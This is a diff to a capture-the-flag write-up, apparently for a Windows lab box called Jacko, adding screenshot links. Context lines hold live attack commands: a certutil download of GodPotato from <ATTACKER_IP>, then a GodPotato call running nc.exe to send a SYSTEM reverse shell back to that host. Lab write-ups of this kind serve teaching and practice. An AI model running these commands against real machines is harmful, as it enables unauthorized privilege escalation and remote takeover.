@@ -26,8 +26,12 @@ over older Potato variants because the target is Windows 10.
 sudo nmap -sCV -p- <TARGET_IP>
 ```
 
+![nmap service scan](./assets/jacko/01-nmap.png)
+
 Port 8082 served an **H2 database** console, reachable without any login
 prompt. The console itself disclosed its version (1.4.199) directly.
+
+![the unauthenticated H2 console](./assets/jacko/02-h2-console.png)
 
 ---
 
@@ -61,6 +65,8 @@ COM abuse path) was the right tool for this OS version:
 certutil -urlcache -split -f http://<ATTACKER_IP>/GodPotato.exe GodPotato.exe
 GodPotato.exe -cmd "cmd /c C:\Users\Public\nc.exe -e cmd.exe <ATTACKER_IP> 1234"
 ```
+
+![running GodPotato to spawn a SYSTEM-owned reverse shell](./assets/jacko/03-godpotato.png)
 
 Admin shell caught on the listener. Root flag retrieved.
 
